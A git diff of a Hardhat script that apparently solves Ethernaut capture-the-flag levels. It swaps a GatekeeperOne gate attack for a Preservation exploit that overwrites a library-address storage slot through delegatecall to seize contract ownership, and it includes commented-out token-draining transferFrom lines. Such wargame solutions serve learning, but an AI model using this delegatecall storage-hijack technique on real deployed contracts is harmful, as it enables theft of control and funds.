@@ -3,8 +3,8 @@ const hre = require("hardhat");
 async function main() {
     
     //Params
-    levelAddress = "0xBB27Fc38DB9476c2EdaeEC80d1fb34c060999E01";
-    contractName = "GatekeeperOne";
+    levelAddress = "0xd731Bf4a1a2222c4f96F29576C18aD99FCE0C330";
+    contractName = "Preservation";
 
     const account = await hre.ethers.getSigner();
     console.log(`Working with account ${account.address}`);
@@ -12,18 +12,23 @@ async function main() {
     const level = await Level.attach(levelAddress);
     // const level = await Level.deploy();
     console.log(`Level at address ${level.address}`);
+    // let amount = await level.balanceOf(account.address);
+    // let approveTx = await level.increaseAllowance(account.address,amount);
+    // let approvert = await approveTx.wait();
+    // let tx = await level.transferFrom(account.address,'0x1d434a6645A446f7c38efd41f66f748278332CA0',amount)
+    // let tr = await tx.wait()
 
-    let result = await level.entrant();
-    console.log(result);
     const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
-    const attacker = await Attacker.deploy(level.address);
-    // const attacker = await Attacker.attach("0x0B6f113d2EF95832f498a45E1273d4E5542AC13F");
+    const attacker = await Attacker.deploy();
+    // const attacker = await Attacker.attach("0xC983740AAfDccD7b727E1dcb982932536A45ad27");
     console.log(`Attacker at ${attacker.address}`);
 
-    let tx = await attacker.attack(819354);//819354-819109 863758-863513//1380252-1077347//1638448-1077296 //Operations until gateTwo takes 819365-819117=248 819117 816257
-    let tr = await tx.wait();
+    let tx = await level.setSecondTime(attacker.address);
+    let tr = await tx.wait()
 
-    result = await level.entrant();
+    tx = await level.setFirstTime(account.address);
+    tr = await tx.wait();
+    result = await level.owner();
     console.log(result);
 }
 
